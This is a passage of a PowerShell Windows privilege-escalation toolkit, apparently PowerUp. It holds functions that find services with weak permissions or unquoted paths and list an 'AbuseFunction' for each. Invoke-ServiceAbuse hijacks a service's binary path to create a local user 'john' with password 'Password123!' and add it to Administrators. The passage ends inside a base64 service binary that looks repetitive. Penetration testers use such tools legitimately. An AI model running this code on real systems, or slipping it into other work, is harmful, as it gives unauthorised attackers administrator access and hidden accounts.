        [ValidateSet('SeCreateTokenPrivilege', 'SeAssignPrimaryTokenPrivilege', 'SeLockMemoryPrivilege', 'SeIncreaseQuotaPrivilege', 'SeUnsolicitedInputPrivilege', 'SeMachineAccountPrivilege', 'SeTcbPrivilege', 'SeSecurityPrivilege', 'SeTakeOwnershipPrivilege', 'SeLoadDriverPrivilege', 'SeSystemProfilePrivilege', 'SeSystemtimePrivilege', 'SeProfileSingleProcessPrivilege', 'SeIncreaseBasePriorityPrivilege', 'SeCreatePagefilePrivilege', 'SeCreatePermanentPrivilege', 'SeBackupPrivilege', 'SeRestorePrivilege', 'SeShutdownPrivilege', 'SeDebugPrivilege', 'SeAuditPrivilege', 'SeSystemEnvironmentPrivilege', 'SeChangeNotifyPrivilege', 'SeRemoteShutdownPrivilege', 'SeUndockPrivilege', 'SeSyncAgentPrivilege', 'SeEnableDelegationPrivilege', 'SeManageVolumePrivilege', 'SeImpersonatePrivilege', 'SeCreateGlobalPrivilege', 'SeTrustedCredManAccessPrivilege', 'SeRelabelPrivilege', 'SeIncreaseWorkingSetPrivilege', 'SeTimeZonePrivilege', 'SeCreateSymbolicLinkPrivilege')]
        [String[]]
        $Privilege
    )

    PROCESS {
        ForEach ($Priv in $Privilege) {
            [UInt32]$PreviousState = 0
            Write-Verbose "Attempting to enable $Priv"
            $Success = $NTDll::RtlAdjustPrivilege($SecurityEntity::$Priv, $True, $False, [ref]$PreviousState)
            if ($Success -ne 0) {
                Write-Warning "RtlAdjustPrivilege for $Priv failed: $Success"
            }
        }
    }
}


function Add-ServiceDacl {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('ServiceProcess.ServiceController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name
    )

    BEGIN {
        filter Local:Get-ServiceReadControlHandle {
            [OutputType([IntPtr])]
            Param(
                [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
                [ValidateNotNullOrEmpty()]
                [ValidateScript({ $_ -as 'ServiceProcess.ServiceController' })]
                $Service
            )

            $GetServiceHandle = [ServiceProcess.ServiceController].GetMethod('GetServiceHandle', [Reflection.BindingFlags] 'Instance, NonPublic')
            $ReadControl = 0x00020000
            $RawHandle = $GetServiceHandle.Invoke($Service, @($ReadControl))
            $RawHandle
        }
    }

    PROCESS {
        ForEach($ServiceName in $Name) {

            $IndividualService = Get-Service -Name $ServiceName -ErrorAction Stop

            try {
                Write-Verbose "Add-ServiceDacl IndividualService : $($IndividualService.Name)"
                $ServiceHandle = Get-ServiceReadControlHandle -Service $IndividualService
            }
            catch {
                $ServiceHandle = $Null
                Write-Verbose "Error opening up the service handle with read control for $($IndividualService.Name) : $_"
            }

            if ($ServiceHandle -and ($ServiceHandle -ne [IntPtr]::Zero)) {
                $SizeNeeded = 0

                $Result = $Advapi32::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, @(), 0, [Ref] $SizeNeeded);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                # 122 == The data area passed to a system call is too small
                if ((-not $Result) -and ($LastError -eq 122) -and ($SizeNeeded -gt 0)) {
                    $BinarySecurityDescriptor = New-Object Byte[]($SizeNeeded)

                    $Result = $Advapi32::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, $BinarySecurityDescriptor, $BinarySecurityDescriptor.Count, [Ref] $SizeNeeded);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                    if (-not $Result) {
                        Write-Error ([ComponentModel.Win32Exception] $LastError)
                    }
                    else {
                        $RawSecurityDescriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $BinarySecurityDescriptor, 0
                        $Dacl = $RawSecurityDescriptor.DiscretionaryAcl | ForEach-Object {
                            Add-Member -InputObject $_ -MemberType NoteProperty -Name AccessRights -Value ($_.AccessMask -as $ServiceAccessRights) -PassThru
                        }
                        Add-Member -InputObject $IndividualService -MemberType NoteProperty -Name Dacl -Value $Dacl -PassThru
                    }
                }
                else {
                    Write-Error ([ComponentModel.Win32Exception] $LastError)
                }
                $Null = $Advapi32::CloseServiceHandle($ServiceHandle)
            }
        }
    }
}


function Set-ServiceBinaryPath {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [OutputType('System.Boolean')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name,

        [Parameter(Position=1, Mandatory = $True)]
        [Alias('BinaryPath', 'binPath')]
        [String]
        [ValidateNotNullOrEmpty()]
        $Path
    )

    BEGIN {
        filter Local:Get-ServiceConfigControlHandle {
            [OutputType([IntPtr])]
            Param(
                [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
                [ServiceProcess.ServiceController]
                [ValidateNotNullOrEmpty()]
                $TargetService
            )
            $GetServiceHandle = [ServiceProcess.ServiceController].GetMethod('GetServiceHandle', [Reflection.BindingFlags] 'Instance, NonPublic')
            $ConfigControl = 0x00000002
            $RawHandle = $GetServiceHandle.Invoke($TargetService, @($ConfigControl))
            $RawHandle
        }
    }

    PROCESS {

        ForEach($IndividualService in $Name) {

            $TargetService = Get-Service -Name $IndividualService -ErrorAction Stop
            try {
                $ServiceHandle = Get-ServiceConfigControlHandle -TargetService $TargetService
            }
            catch {
                $ServiceHandle = $Null
                Write-Verbose "Error opening up the service handle with read control for $IndividualService : $_"
            }

            if ($ServiceHandle -and ($ServiceHandle -ne [IntPtr]::Zero)) {

                $SERVICE_NO_CHANGE = [UInt32]::MaxValue
                $Result = $Advapi32::ChangeServiceConfig($ServiceHandle, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, "$Path", [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                if ($Result -ne 0) {
                    Write-Verbose "binPath for $IndividualService successfully set to '$Path'"
                    $True
                }
                else {
                    Write-Error ([ComponentModel.Win32Exception] $LastError)
                    $Null
                }

                $Null = $Advapi32::CloseServiceHandle($ServiceHandle)
            }
        }
    }
}


function Test-ServiceDaclPermission {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('ServiceProcess.ServiceController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName', 'Service')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name,

        [String[]]
        [ValidateSet('QueryConfig', 'ChangeConfig', 'QueryStatus', 'EnumerateDependents', 'Start', 'Stop', 'PauseContinue', 'Interrogate', 'UserDefinedControl', 'Delete', 'ReadControl', 'WriteDac', 'WriteOwner', 'Synchronize', 'AccessSystemSecurity', 'GenericAll', 'GenericExecute', 'GenericWrite', 'GenericRead', 'AllAccess')]
        $Permissions,

        [String]
        [ValidateSet('ChangeConfig', 'Restart', 'AllAccess')]
        $PermissionSet = 'ChangeConfig'
    )

    BEGIN {
        $AccessMask = @{
            'QueryConfig'           = [uint32]'0x00000001'
            'ChangeConfig'          = [uint32]'0x00000002'
            'QueryStatus'           = [uint32]'0x00000004'
            'EnumerateDependents'   = [uint32]'0x00000008'
            'Start'                 = [uint32]'0x00000010'
            'Stop'                  = [uint32]'0x00000020'
            'PauseContinue'         = [uint32]'0x00000040'
            'Interrogate'           = [uint32]'0x00000080'
            'UserDefinedControl'    = [uint32]'0x00000100'
            'Delete'                = [uint32]'0x00010000'
            'ReadControl'           = [uint32]'0x00020000'
            'WriteDac'              = [uint32]'0x00040000'
            'WriteOwner'            = [uint32]'0x00080000'
            'Synchronize'           = [uint32]'0x00100000'
            'AccessSystemSecurity'  = [uint32]'0x01000000'
            'GenericAll'            = [uint32]'0x10000000'
            'GenericExecute'        = [uint32]'0x20000000'
            'GenericWrite'          = [uint32]'0x40000000'
            'GenericRead'           = [uint32]'0x80000000'
            'AllAccess'             = [uint32]'0x000F01FF'
        }

        $CheckAllPermissionsInSet = $False

        if ($PSBoundParameters['Permissions']) {
            $TargetPermissions = $Permissions
        }
        else {
            if ($PermissionSet -eq 'ChangeConfig') {
                $TargetPermissions = @('ChangeConfig', 'WriteDac', 'WriteOwner', 'GenericAll', ' GenericWrite', 'AllAccess')
            }
            elseif ($PermissionSet -eq 'Restart') {
                $TargetPermissions = @('Start', 'Stop')
                $CheckAllPermissionsInSet = $True # so we check all permissions && style
            }
            elseif ($PermissionSet -eq 'AllAccess') {
                $TargetPermissions = @('GenericAll', 'AllAccess')
            }
        }
    }

    PROCESS {

        ForEach($IndividualService in $Name) {

            $TargetService = $IndividualService | Add-ServiceDacl

            if ($TargetService -and $TargetService.Dacl) {

                # enumerate all group SIDs the current user is a part of
                $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                $CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
                $CurrentUserSids += $UserIdentity.User.Value

                ForEach($ServiceDacl in $TargetService.Dacl) {
                    if ($CurrentUserSids -contains $ServiceDacl.SecurityIdentifier) {

                        if ($CheckAllPermissionsInSet) {
                            $AllMatched = $True
                            ForEach($TargetPermission in $TargetPermissions) {
                                # check permissions && style
                                if (($ServiceDacl.AccessRights -band $AccessMask[$TargetPermission]) -ne $AccessMask[$TargetPermission]) {
                                    # Write-Verbose "Current user doesn't have '$TargetPermission' for $($TargetService.Name)"
                                    $AllMatched = $False
                                    break
                                }
                            }
                            if ($AllMatched) {
                                $TargetService
                            }
                        }
                        else {
                            ForEach($TargetPermission in $TargetPermissions) {
                                # check permissions || style
                                if (($ServiceDacl.AceType -eq 'AccessAllowed') -and ($ServiceDacl.AccessRights -band $AccessMask[$TargetPermission]) -eq $AccessMask[$TargetPermission]) {
                                    Write-Verbose "Current user has '$TargetPermission' for $IndividualService"
                                    $TargetService
                                    break
                                }
                            }
                        }
                    }
                }
            }
            else {
                Write-Verbose "Error enumerating the Dacl for service $IndividualService"
            }
        }
    }
}



function Get-UnquotedService {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.UnquotedService')]
    [CmdletBinding()]
    Param()

    # find all paths to service .exe's that have a space in the path and aren't quoted
    $VulnServices = Get-WmiObject -Class win32_service | Where-Object {
        $_ -and ($Null -ne $_.pathname) -and ($_.pathname.Trim() -ne '') -and (-not $_.pathname.StartsWith("`"")) -and (-not $_.pathname.StartsWith("'")) -and ($_.pathname.Substring(0, $_.pathname.ToLower().IndexOf('.exe') + 4)) -match '.* .*'
    }

    if ($VulnServices) {
        ForEach ($Service in $VulnServices) {

            $SplitPathArray = $Service.pathname.Split(' ')
            $ConcatPathArray = @()
            for ($i=0;$i -lt $SplitPathArray.Count; $i++) {
                        $ConcatPathArray += $SplitPathArray[0..$i] -join ' '
            }

            $ModifiableFiles = $ConcatPathArray | Get-ModifiablePath

            $ModifiableFiles | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {
                $CanRestart = Test-ServiceDaclPermission -PermissionSet 'Restart' -Name $Service.name
                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'ServiceName' $Service.name
                $Out | Add-Member Noteproperty 'Path' $Service.pathname
                $Out | Add-Member Noteproperty 'ModifiablePath' $_
                $Out | Add-Member Noteproperty 'StartName' $Service.startname
                $Out | Add-Member Noteproperty 'AbuseFunction' "Write-ServiceBinary -Name '$($Service.name)' -Path <HijackPath>"
                $Out | Add-Member Noteproperty 'CanRestart' ([Bool]$CanRestart)
                $Out | Add-Member Aliasproperty Name ServiceName
                $Out.PSObject.TypeNames.Insert(0, 'PowerUp.UnquotedService')
                $Out
            }
        }
    }
}


function Get-ModifiableServiceFile {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ModifiableServiceFile')]
    [CmdletBinding()]
    Param()

    Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pathname} | ForEach-Object {

        $ServiceName = $_.name
        $ServicePath = $_.pathname
        $ServiceStartName = $_.startname

        $ServicePath | Get-ModifiablePath | ForEach-Object {
            $CanRestart = Test-ServiceDaclPermission -PermissionSet 'Restart' -Name $ServiceName
            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
            $Out | Add-Member Noteproperty 'Path' $ServicePath
            $Out | Add-Member Noteproperty 'ModifiableFile' $_.ModifiablePath
            $Out | Add-Member Noteproperty 'ModifiableFilePermissions' $_.Permissions
            $Out | Add-Member Noteproperty 'ModifiableFileIdentityReference' $_.IdentityReference
            $Out | Add-Member Noteproperty 'StartName' $ServiceStartName
            $Out | Add-Member Noteproperty 'AbuseFunction' "Install-ServiceBinary -Name '$ServiceName'"
            $Out | Add-Member Noteproperty 'CanRestart' ([Bool]$CanRestart)
            $Out | Add-Member Aliasproperty Name ServiceName
            $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiableServiceFile')
            $Out
        }
    }
}


function Get-ModifiableService {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ModifiableService')]
    [CmdletBinding()]
    Param()

    Get-Service | Test-ServiceDaclPermission -PermissionSet 'ChangeConfig' | ForEach-Object {
        $ServiceDetails = $_ | Get-ServiceDetail
        $CanRestart = $_ | Test-ServiceDaclPermission -PermissionSet 'Restart'
        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'ServiceName' $ServiceDetails.name
        $Out | Add-Member Noteproperty 'Path' $ServiceDetails.pathname
        $Out | Add-Member Noteproperty 'StartName' $ServiceDetails.startname
        $Out | Add-Member Noteproperty 'AbuseFunction' "Invoke-ServiceAbuse -Name '$($ServiceDetails.name)'"
        $Out | Add-Member Noteproperty 'CanRestart' ([Bool]$CanRestart)
        $Out | Add-Member Aliasproperty Name ServiceName
        $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiableService')
        $Out
    }
}


function Get-ServiceDetail {

    [OutputType('PowerUp.ModifiableService')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name
    )

    PROCESS {
        ForEach($IndividualService in $Name) {
            $TargetService = Get-Service -Name $IndividualService -ErrorAction Stop
            if ($TargetService) {
                Get-WmiObject -Class win32_service -Filter "Name='$($TargetService.Name)'" | Where-Object {$_} | ForEach-Object {
                    try {
                        $_
                    }
                    catch {
                        Write-Verbose "Error: $_"
                    }
                }
            }
        }
    }
}


function Invoke-ServiceAbuse {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingUserNameAndPassWordParams', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerUp.AbusedService')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserName = 'john',

        [ValidateNotNullOrEmpty()]
        [String]
        $Password = 'Password123!',

        [ValidateNotNullOrEmpty()]
        [String]
        $LocalGroup = 'Administrators',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [String]
        [ValidateNotNullOrEmpty()]
        $Command,

        [Switch]
        $Force
    )

    BEGIN {

        if ($PSBoundParameters['Command']) {
            $ServiceCommands = @($Command)
        }

        else {
            if ($PSBoundParameters['Credential']) {
                $UserNameToAdd = $Credential.UserName
                $PasswordToAdd = $Credential.GetNetworkCredential().Password
            }
            else {
                $UserNameToAdd = $UserName
                $PasswordToAdd = $Password
            }

            if ($UserNameToAdd.Contains('\')) {
                # only adding a domain user to the local group, no user creation
                $ServiceCommands = @("net localgroup $LocalGroup $UserNameToAdd /add")
            }
            else {
                # create a local user and add it to the local specified group
                $ServiceCommands = @("net user $UserNameToAdd $PasswordToAdd /add", "net localgroup $LocalGroup $UserNameToAdd /add")
            }
        }
    }

    PROCESS {

        ForEach($IndividualService in $Name) {

            $TargetService = Get-Service -Name $IndividualService -ErrorAction Stop
            $ServiceDetails = $TargetService | Get-ServiceDetail

            $RestoreDisabled = $False
            if ($ServiceDetails.StartMode -match 'Disabled') {
                Write-Verbose "Service '$(ServiceDetails.Name)' disabled, enabling..."
                $TargetService | Set-Service -StartupType Manual -ErrorAction Stop
                $RestoreDisabled = $True
            }

            $OriginalServicePath = $ServiceDetails.PathName
            $OriginalServiceState = $ServiceDetails.State

            Write-Verbose "Service '$($TargetService.Name)' original path: '$OriginalServicePath'"
            Write-Verbose "Service '$($TargetService.Name)' original state: '$OriginalServiceState'"

            ForEach($ServiceCommand in $ServiceCommands) {

                if ($PSBoundParameters['Force']) {
                    $TargetService | Stop-Service -Force -ErrorAction Stop
                }
                else {
                    $TargetService | Stop-Service -ErrorAction Stop
                }

                Write-Verbose "Executing command '$ServiceCommand'"
                $Success = $TargetService | Set-ServiceBinaryPath -Path "$ServiceCommand"

                if (-not $Success) {
                    throw "Error reconfiguring the binary path for $($TargetService.Name)"
                }

                $TargetService | Start-Service -ErrorAction SilentlyContinue
                Start-Sleep -Seconds 2
            }

            if ($PSBoundParameters['Force']) {
                $TargetService | Stop-Service -Force -ErrorAction Stop
            }
            else {
                $TargetService | Stop-Service -ErrorAction Stop
            }

            Write-Verbose "Restoring original path to service '$($TargetService.Name)'"
            Start-Sleep -Seconds 1
            $Success = $TargetService | Set-ServiceBinaryPath -Path "$OriginalServicePath"

            if (-not $Success) {
                throw "Error restoring the original binPath for $($TargetService.Name)"
            }

            # try to restore the service to whatever the service's original state was
            if ($RestoreDisabled) {
                Write-Verbose "Re-disabling service '$($TargetService.Name)'"
                $TargetService | Set-Service -StartupType Disabled -ErrorAction Stop
            }
            elseif ($OriginalServiceState -eq "Paused") {
                Write-Verbose "Starting and then pausing service '$($TargetService.Name)'"
                $TargetService | Start-Service
                Start-Sleep -Seconds 1
                $TargetService | Set-Service -Status Paused -ErrorAction Stop
            }
            elseif ($OriginalServiceState -eq "Stopped") {
                Write-Verbose "Leaving service '$($TargetService.Name)' in stopped state"
            }
            else {
                Write-Verbose "Restarting '$($TargetService.Name)'"
                $TargetService | Start-Service
            }

            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'ServiceAbused' $TargetService.Name
            $Out | Add-Member Noteproperty 'Command' $($ServiceCommands -join ' && ')
            $Out.PSObject.TypeNames.Insert(0, 'PowerUp.AbusedService')
            $Out
        }
    }
}


function Write-ServiceBinary {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingUserNameAndPassWordParams', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerUp.ServiceBinary')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName')]
        [String]
        [ValidateNotNullOrEmpty()]
        $Name,

        [String]
        $UserName = 'john',

        [String]
        $Password = 'Password123!',

        [String]
        $LocalGroup = 'Administrators',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [String]
        [ValidateNotNullOrEmpty()]
        $Command,

        [String]
        $Path = "$(Convert-Path .)\service.exe"
    )

    BEGIN {
        # the raw unpatched service binary
        $B64Binary = "TACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgA